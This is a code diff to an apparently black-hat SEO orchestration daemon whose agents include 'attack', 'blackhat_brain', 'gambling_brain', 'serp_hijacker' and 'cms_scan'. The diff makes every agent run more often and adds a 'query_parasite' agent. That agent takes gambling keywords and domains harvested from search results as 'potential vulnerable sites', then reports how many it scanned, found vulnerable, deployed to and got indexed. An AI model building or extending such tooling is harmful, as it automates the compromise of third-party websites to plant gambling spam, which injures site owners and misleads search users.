@@ -70,7 +70,7 @@ export interface OrchestratorState {
   successfulRecoveries: number;
 }
 
-type AgentName = "attack" | "seo" | "scan" | "research" | "learning" | "cve" | "keyword_discovery" | "gambling_brain" | "cms_scan" | "blackhat_brain" | "sprint_engine" | "ctr_engine" | "freshness_engine" | "gap_analyzer" | "serp_hijacker" | "serp_harvester" | "content_distributor" | "persistence_monitor";
+type AgentName = "attack" | "seo" | "scan" | "research" | "learning" | "cve" | "keyword_discovery" | "gambling_brain" | "cms_scan" | "blackhat_brain" | "sprint_engine" | "ctr_engine" | "freshness_engine" | "gap_analyzer" | "serp_hijacker" | "serp_harvester" | "content_distributor" | "persistence_monitor" | "query_parasite";
 
 // ═══════════════════════════════════════════════
 //  DEFAULT AGENT CONFIGS
@@ -78,75 +78,79 @@ type AgentName = "attack" | "seo" | "scan" | "research" | "learning" | "cve" | "
 
 const DEFAULT_AGENTS: Record<AgentName, AgentConfig> = {
   attack: {
-    enabled: true, intervalMs: 1 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
+    enabled: true, intervalMs: 30 * 60 * 1000, maxConcurrent: 2, autoStart: true,
     consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
   },
   seo: {
-    enabled: true, intervalMs: 4 * 60 * 60 * 1000, maxConcurrent: 2, autoStart: true,
+    enabled: true, intervalMs: 2 * 60 * 60 * 1000, maxConcurrent: 2, autoStart: true,
     consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
   },
   scan: {
-    enabled: true, intervalMs: 6 * 60 * 60 * 1000, maxConcurrent: 2, autoStart: true,
+    enabled: true, intervalMs: 3 * 60 * 60 * 1000, maxConcurrent: 2, autoStart: true,
     consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
   },
   research: {
-    enabled: true, intervalMs: 8 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
+    enabled: true, intervalMs: 4 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
     consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
   },
   learning: {
-    enabled: true, intervalMs: 6 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
+    enabled: true, intervalMs: 3 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
     consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
   },
   cve: {
-    enabled: true, intervalMs: 24 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
+    enabled: true, intervalMs: 12 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
     consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
   },
   keyword_discovery: {
-    enabled: true, intervalMs: 3 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
+    enabled: true, intervalMs: 1.5 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
     consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
   },
   gambling_brain: {
-    enabled: true, intervalMs: 4 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
+    enabled: true, intervalMs: 2 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
     consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
   },
   cms_scan: {
-    enabled: true, intervalMs: 2 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
+    enabled: true, intervalMs: 1 * 60 * 60 * 1000, maxConcurrent: 2, autoStart: true,
     consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
   },
   blackhat_brain: {
-    enabled: true, intervalMs: 3 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
+    enabled: true, intervalMs: 1.5 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
     consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
   },
   sprint_engine: {
-    enabled: true, intervalMs: 24 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
+    enabled: true, intervalMs: 12 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
     consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
   },
   ctr_engine: {
-    enabled: true, intervalMs: 12 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
+    enabled: true, intervalMs: 4 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
     consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
   },
   freshness_engine: {
-    enabled: true, intervalMs: 48 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
-    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
-  },
-  gap_analyzer: {
-    enabled: true, intervalMs: 24 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
-    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
-  },
-  serp_hijacker: {
     enabled: true, intervalMs: 12 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
     consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
   },
+  gap_analyzer: {
+    enabled: true, intervalMs: 6 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
+    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
+  },
+  serp_hijacker: {
+    enabled: true, intervalMs: 4 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
+    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
+  },
   serp_harvester: {
-    enabled: true, intervalMs: 2 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
+    enabled: true, intervalMs: 1 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
     consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
   },
   content_distributor: {
-    enabled: true, intervalMs: 3 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
+    enabled: true, intervalMs: 1.5 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
     consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
   },
   persistence_monitor: {
-    enabled: true, intervalMs: 4 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
+    enabled: true, intervalMs: 2 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
+    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
+  },
+  query_parasite: {
+    enabled: true, intervalMs: 1 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
     consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
   },
 };
@@ -848,6 +852,59 @@ async function executeContentDistributeTask(_task: DaemonTask, _signal: AbortSig
   }
 }
 
+async function executeQueryParasiteTask(_task: DaemonTask, _signal: AbortSignal): Promise<{ success: boolean; result?: Record<string, unknown>; error?: string }> {
+  try {
+    const { queryParasiteTick } = await import("./query-param-parasite");
+    const { getAllActiveSeoProjects, getDb } = await import("./db");
+    const { serpDiscoveredTargets } = await import("../drizzle/schema");
+    const { eq } = await import("drizzle-orm");
+
+    // Get gambling keywords from active SEO projects
+    const projects = await getAllActiveSeoProjects();
+    const allKeywords: string[] = [];
+    for (const proj of projects) {
+      const kws = (proj as any).targetKeywords || (proj as any).seedKeywords || [];
+      allKeywords.push(...(Array.isArray(kws) ? kws : []));
+    }
+    const keywordSet = new Set(allKeywords);
+    const uniqueKeywords = Array.from(keywordSet).filter(k => k.length <= 60).slice(0, 30);
+
+    // Get discovered targets from SERP harvester as potential vulnerable sites
+    let targetDomains: string[] = [];
+    try {
+      const db = await getDb();
+      if (db) {
+        const discovered = await db.select({ domain: serpDiscoveredTargets.domain })
+          .from(serpDiscoveredTargets)
+          .where(eq(serpDiscoveredTargets.status, "discovered"))
+          .limit(20);
+        targetDomains = discovered.map((d: any) => d.domain).filter(Boolean);
+      }
+    } catch {
+      // Fallback: use project domains
+      targetDomains = projects.map(p => p.domain).filter(Boolean);
+    }
+
+    if (uniqueKeywords.length === 0 || targetDomains.length === 0) {
+      return { success: true, result: { message: "No keywords or targets available for query parasite", scanned: 0 } };
+    }
+
+    const result = await queryParasiteTick(uniqueKeywords, targetDomains);
+    return {
+      success: true,
+      result: {
+        scanned: result.scanned,
+        vulnerable: result.vulnerable,
+        deployed: result.deployed,
+        indexed: result.indexed,
+        message: `Query Parasite: scanned ${result.scanned}, found ${result.vulnerable} vulnerable, deployed ${result.deployed}, indexed ${result.indexed}`,
+      },
+    };
+  } catch (err: any) {
+    return { success: false, error: err.message };
+  }
+}
+
 async function executePersistenceCheckTask(_task: DaemonTask, _signal: AbortSignal): Promise<{ success: boolean; result?: Record<string, unknown>; error?: string }> {
   try {
     const { runPersistenceCheck } = await import("./persistence-monitor");
@@ -1123,6 +1180,7 @@ async function orchestratorTick() {
         serp_harvester: "serp_harvest",
         content_distributor: "content_distribute",
         persistence_monitor: "persistence_check",
+        query_parasite: "query_parasite_tick",
       };
 
       const taskId = await enqueueTask({
@@ -1186,6 +1244,7 @@ export function startOrchestrator(customAgents?: Partial<Record<AgentName, Parti
   registerExecutor("serp_harvest", executeSerpHarvestTask);
   registerExecutor("content_distribute", executeContentDistributeTask);
   registerExecutor("persistence_check", executePersistenceCheckTask);
+  registerExecutor("query_parasite_tick", executeQueryParasiteTask);
 
   // Set initial next-run times (stagger to avoid thundering herd)
   const now = Date.now();
@@ -1629,6 +1688,23 @@ const RECOVERY_STRATEGIES: Record<AgentName, RecoveryStrategy[]> = {
     {
       name: "pause_persistence_monitor",
       description: "Pause persistence monitor",
+      apply: (_name, config) => { config.enabled = false; },
+    },
+  ],
+  query_parasite: [
+    {
+      name: "increase_parasite_interval",
+      description: "Increase query parasite interval to 4h",
+      apply: (_name, config) => { config.intervalMs = 4 * 60 * 60_000; },
+    },
+    {
+      name: "reduce_parasite_scope",
+      description: "Reduce scope and increase interval to 6h",
+      apply: (_name, config) => { config.intervalMs = 6 * 60 * 60_000; },
+    },
+    {
+      name: "pause_query_parasite",
+      description: "Pause query parasite engine",
       apply: (_name, config) => { config.enabled = false; },
     },
   ],
